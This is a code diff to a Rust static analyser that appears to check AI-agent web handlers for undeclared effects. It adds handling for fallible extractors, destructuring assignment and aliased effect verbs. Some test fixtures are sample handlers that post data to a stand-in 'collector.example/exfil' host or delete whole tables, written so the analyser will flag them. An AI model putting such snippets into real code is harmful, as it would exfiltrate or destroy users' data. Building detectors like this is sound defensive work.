@@ -242,8 +242,12 @@ const TRANSPARENT_WRAPPERS: &[&str] = &[
     "RwLock",
     "RefCell",
     "Cell",
-    "Rc",
     "Pin",
+    // A fallible extractor: `Result<Extension<Db>, AutumnError>` is the handle
+    // it wraps once `?` or `unwrap()` has run, and both are transparent here.
+    // Only the first type argument is traversed, so an error type can never
+    // make something a handle.
+    "Result",
 ];
 
 /// Extractor wrappers that are never handles, whatever they carry. Recursing
@@ -259,7 +263,6 @@ const EXTRACTOR_WRAPPERS: &[&str] = &[
     "Multipart",
     "Bytes",
     "RawBody",
-    "Result",
 ];
 
 /// Exact type names that name the webhook fan-out manager.
@@ -753,6 +756,9 @@ struct Analyzer {
     closures: HashMap<String, syn::ExprClosure>,
     /// Names bound to a `spawn`-family function (`let s = tokio::spawn;`).
     spawn_aliases: HashSet<String>,
+    /// Names bound to some other effect verb as a function item, and the path
+    /// they were bound to (`let schedule = NotifyFinanceJob::enqueue;`).
+    fn_aliases: HashMap<String, syn::Path>,
 }
 
 impl Analyzer {
@@ -769,6 +775,7 @@ impl Analyzer {
             suppress: 0,
             closures: HashMap::new(),
             spawn_aliases: HashSet::new(),
+            fn_aliases: HashMap::new(),
         }
     }
 
@@ -999,9 +1006,17 @@ impl Analyzer {
                 {
                     self.spawn_aliases.insert(name);
                 }
+                // `let schedule = NotifyFinanceJob::enqueue;` — a function
+                // item bound to a local name. The call site then mentions no
+                // verb the sweep can see, so the aliased *path* is remembered
+                // and the call is classified against it.
+                Expr::Path(path) if is_effect_verb_path(&path.path) => {
+                    self.fn_aliases.insert(name, path.path.clone());
+                }
                 _ => {
                     self.closures.remove(&name);
                     self.spawn_aliases.remove(&name);
+                    self.fn_aliases.remove(&name);
                 }
             }
         }
@@ -1029,6 +1044,58 @@ impl Analyzer {
         // Shadowing: `let repo = repo.find_all().await?;` rebinds the name to
         // a `Vec`, and the old identity has to go with it.
         self.rebind(&local.pat, None);
+    }
+
+    /// Propagate handle identity across an assignment, element-wise.
+    ///
+    /// `active = repo;` makes `active` a handle just as a `let` would, and a
+    /// non-handle right-hand side clears it. Destructuring assignment —
+    /// `(active, _) = (repo, id);` — is the same move written with a tuple on
+    /// each side, and pairing the two is what `bind_handles` already does for
+    /// the `let` spelling.
+    fn assign_handles(&mut self, left: &Expr, right: &Expr) {
+        match (left, right) {
+            (Expr::Paren(l), _) => self.assign_handles(&l.expr, right),
+            (Expr::Group(l), _) => self.assign_handles(&l.expr, right),
+            (_, Expr::Paren(r)) => self.assign_handles(left, &r.expr),
+            (_, Expr::Group(r)) => self.assign_handles(left, &r.expr),
+            (Expr::Tuple(l), Expr::Tuple(r)) if l.elems.len() == r.elems.len() => {
+                for (target, value) in l.elems.iter().zip(r.elems.iter()) {
+                    self.assign_handles(target, value);
+                }
+            }
+            // `(active, key) = pair;` — the shape of the right-hand side is
+            // not readable, so every target takes whatever it carries.
+            (Expr::Tuple(l), _) => {
+                let handle = self.container_handle(right);
+                for target in &l.elems {
+                    self.assign_handle_to(target, handle.as_ref());
+                }
+            }
+            (target, _) => {
+                let handle = self.expr_handle(right);
+                self.assign_handle_to(target, handle.as_ref());
+            }
+        }
+    }
+
+    /// One assignment target: bind it, or clear what it used to hold. `_` is a
+    /// discard and names nothing.
+    fn assign_handle_to(&mut self, target: &Expr, handle: Option<&Handle>) {
+        let Expr::Path(path) = target else {
+            return;
+        };
+        let Some(ident) = path.path.get_ident() else {
+            return;
+        };
+        match handle {
+            Some(handle) => {
+                self.handles.insert(ident.to_string(), handle.clone());
+            }
+            None => {
+                self.handles.remove(&ident.to_string());
+            }
+        }
     }
 
     /// Bind an `if let` / `while let` pattern to the handle its scrutinee
@@ -1231,21 +1298,7 @@ impl Analyzer {
             Expr::Assign(a) => {
                 self.expr(&a.left);
                 self.expr(&a.right);
-                // `active = repo;` makes `active` a handle just as a `let`
-                // would, and a non-handle right-hand side clears it.
-                if let Expr::Path(path) = &*a.left
-                    && let Some(ident) = path.path.get_ident()
-                {
-                    let handle = self.expr_handle(&a.right);
-                    match handle {
-                        Some(handle) => {
-                            self.handles.insert(ident.to_string(), handle);
-                        }
-                        None => {
-                            self.handles.remove(&ident.to_string());
-                        }
-                    }
-                }
+                self.assign_handles(&a.left, &a.right);
             }
             Expr::Binary(b) => {
                 self.expr(&b.left);
@@ -1821,6 +1874,16 @@ impl Analyzer {
             return;
         }
 
+        // A call through a name bound to an effect verb performs that verb;
+        // the alias is the only thing at this call site that names it.
+        if let Expr::Path(path) = strip_transparent(&call.func)
+            && let Some(ident) = path.path.get_ident()
+            && let Some(aliased) = self.fn_aliases.get(&ident.to_string()).cloned()
+        {
+            self.aliased_effect(call, ident.to_string().as_str(), &aliased);
+            return;
+        }
+
         let Some(name) = name else {
             return;
         };
@@ -1894,6 +1957,35 @@ impl Analyzer {
                 ),
             );
         }
+    }
+
+    /// A call made through a local alias for an effect verb.
+    ///
+    /// A job is recorded against the *aliased* path, so
+    /// `let schedule = NotifyFinanceJob::enqueue; schedule(args)` names the
+    /// same job the direct spelling would. Every other verb is refused: the
+    /// alias hides which receiver the call acts on, and guessing is what the
+    /// whole gate exists not to do.
+    fn aliased_effect(&mut self, call: &ExprCall, alias: &str, aliased: &syn::Path) {
+        let Some(verb) = aliased.segments.last().map(|s| s.ident.to_string()) else {
+            return;
+        };
+        if is_enqueue(&verb) {
+            let qualifier = path_prefix_expr(aliased);
+            self.job_effect(&verb, &call.args, qualifier.as_ref(), call.span());
+            return;
+        }
+        let action = self.action.clone();
+        let path = path_string(aliased);
+        self.error(
+            call.span(),
+            format!(
+                "agent authority: `{alias}` is a local alias for `{path}`, an effect verb, and \
+                 the call through it names neither the receiver it acts on nor what it acts on \
+                 — so `{action}`'s effects cannot be proven.\n\nCall the verb directly, or \
+                 declare the site with `#[agent_effect(..., reason = \"...\")]`. {GUIDE}"
+            ),
+        );
     }
 
     /// The UFCS spelling of an effect verb: `Type::verb(&handle, ..)`.
@@ -2445,6 +2537,41 @@ fn handle_arg_name(expr: &Expr) -> Option<String> {
     }
 }
 
+/// Is this path a function item whose last segment is an effect verb?
+///
+/// `enqueue*` is recorded against the path; the rest are refused at the call.
+/// Deliberately narrow: a `let` bound to a path is nearly always a value, and
+/// only these names carry an effect on their own.
+fn is_effect_verb_path(path: &syn::Path) -> bool {
+    let Some(verb) = path.segments.last().map(|s| s.ident.to_string()) else {
+        return false;
+    };
+    is_enqueue(&verb)
+        || OUTBOUND_VERBS.contains(&verb.as_str())
+        || UNBOUNDED_WRITE_METHODS.contains(&verb.as_str())
+        || is_unbounded_by_column(&verb)
+        || CROSS_TENANT_METHODS.contains(&verb.as_str())
+}
+
+/// `NotifyFinanceJob::enqueue` → the `NotifyFinanceJob` receiver expression.
+fn path_prefix_expr(path: &syn::Path) -> Option<Expr> {
+    let count = path.segments.len().checked_sub(1)?;
+    // Collecting back into a `Punctuated` is what drops the trailing `::` the
+    // removed segment left behind.
+    let segments: syn::punctuated::Punctuated<syn::PathSegment, syn::Token![::]> =
+        path.segments.iter().take(count).cloned().collect();
+    (!segments.is_empty()).then(|| {
+        Expr::Path(syn::ExprPath {
+            attrs: Vec::new(),
+            qself: None,
+            path: syn::Path {
+                leading_colon: path.leading_colon,
+                segments,
+            },
+        })
+    })
+}
+
 /// The path of a `Type::enqueue(...)` receiver, when it names a type.
 fn job_type_path(expr: &Expr) -> Option<syn::Path> {
     let Expr::Path(path) = expr else {
@@ -2658,19 +2785,22 @@ fn type_handle(ty: &Type, generics: &HashSet<String>) -> Option<Handle> {
             }
             if let syn::PathArguments::AngleBracketed(args) = &segment.arguments {
                 let transparent = TRANSPARENT_WRAPPERS.contains(&name.as_str());
-                return args.args.iter().find_map(|arg| match arg {
-                    // Inside a wrapper the analysis knows to be transparent,
-                    // the full rules apply (suffix rules, trait objects, and
-                    // nesting — `Extension<Arc<Db>>`). Inside an unrecognised
-                    // generic type, only an exactly-named handle counts.
-                    syn::GenericArgument::Type(inner) if transparent => {
-                        type_handle(inner, generics)
-                    }
-                    syn::GenericArgument::Type(inner) => (type_named(inner, HANDLE_TYPES)
-                        || type_named(inner, OUTBOUND_TYPES))
-                    .then(|| type_handle(inner, generics))
-                    .flatten(),
+                let mut types = args.args.iter().filter_map(|arg| match arg {
+                    syn::GenericArgument::Type(inner) => Some(inner),
                     _ => None,
+                });
+                // Inside a wrapper the analysis knows to be transparent, the
+                // full rules apply to its *first* type argument (suffix rules,
+                // trait objects, and nesting — `Extension<Arc<Db>>`,
+                // `Result<Extension<Db>, E>`). Inside an unrecognised generic
+                // type, only an exactly-named handle counts, in any position.
+                if transparent {
+                    return types.next().and_then(|inner| type_handle(inner, generics));
+                }
+                return types.find_map(|inner| {
+                    (type_named(inner, HANDLE_TYPES) || type_named(inner, OUTBOUND_TYPES))
+                        .then(|| type_handle(inner, generics))
+                        .flatten()
                 });
             }
             None
@@ -4080,6 +4210,68 @@ mod tests {
                 <Billing as Janitor>::wipe(&repo).await?;
                 Ok(())
             }",
+        ),
+        (
+            // The `let` spelling of this move was always caught; the
+            // destructuring *assignment* propagated nothing, so the write
+            // through `active` was unrooted and silent.
+            "handle moved by destructuring assignment",
+            ExpectedKind::UnboundedWrite,
+            "Refund",
+            r"async fn h(repo: PgRefundRepository, id: i64) -> R {
+                (active, _) = (repo, id);
+                active.delete_all().await?;
+                Ok(())
+            }",
+        ),
+        (
+            "database handle behind a fallible extractor",
+            ExpectedKind::UnboundedWrite,
+            "refunds",
+            r"async fn h(db: Result<Extension<Db>, AutumnError>) -> R {
+                let mut conn = db?;
+                diesel::delete(refunds::table).execute(&mut *conn).await?;
+                Ok(())
+            }",
+        ),
+        (
+            "client behind a fallible extractor",
+            ExpectedKind::Outbound,
+            "https://collector.example/exfil",
+            r#"async fn h(client: Result<Extension<Client>, AutumnError>) -> R {
+                client?.post("https://collector.example/exfil").send().await?;
+                Ok(())
+            }"#,
+        ),
+        (
+            "job enqueued through a function-item alias",
+            ExpectedKind::Job,
+            "NotifyFinanceJob",
+            r"async fn h(repo: PgRefundRepository) -> R {
+                let schedule = NotifyFinanceJob::enqueue;
+                schedule(NotifyFinanceArgs { refund_id: 1 }).await?;
+                Ok(())
+            }",
+        ),
+        (
+            "free-function enqueue through an alias",
+            ExpectedKind::Job,
+            "wire_transfer",
+            r#"async fn h(repo: PgRefundRepository) -> R {
+                let start = autumn_web::job::enqueue;
+                start("wire_transfer", payload).await?;
+                Ok(())
+            }"#,
+        ),
+        (
+            "outbound verb through an alias",
+            ExpectedKind::Rejected,
+            "send_it",
+            r#"async fn h(client: Client) -> R {
+                let send_it = Client::post;
+                send_it(&client, "https://collector.example/exfil").await?;
+                Ok(())
+            }"#,
         ),
         (
             "#[agent_effect] with a blank reason",
